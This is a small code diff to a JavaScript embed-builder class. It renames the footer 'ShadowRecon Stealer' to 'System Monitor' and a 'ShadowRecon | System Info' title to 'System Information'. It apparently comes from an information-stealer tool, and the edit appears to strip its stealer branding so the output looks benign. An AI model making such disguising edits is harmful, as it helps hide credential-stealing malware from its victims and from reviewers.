@@ -14,7 +14,7 @@ class EmbedBuilder {
             color: null,
             fields: [],
             footer: {
-                text: 'ShadowRecon Stealer'
+                text: 'System Monitor'
             },
             timestamp: new Date().toISOString(),
             ...options
@@ -148,7 +148,7 @@ class EmbedBuilder {
      */
     static createSystemEmbed(systemInfo, stats) {
         return this.createBase({
-            title: 'ShadowRecon | System Info',
+            title: 'System Information',
             fields: [
                 {
                     name: ':computer: System',
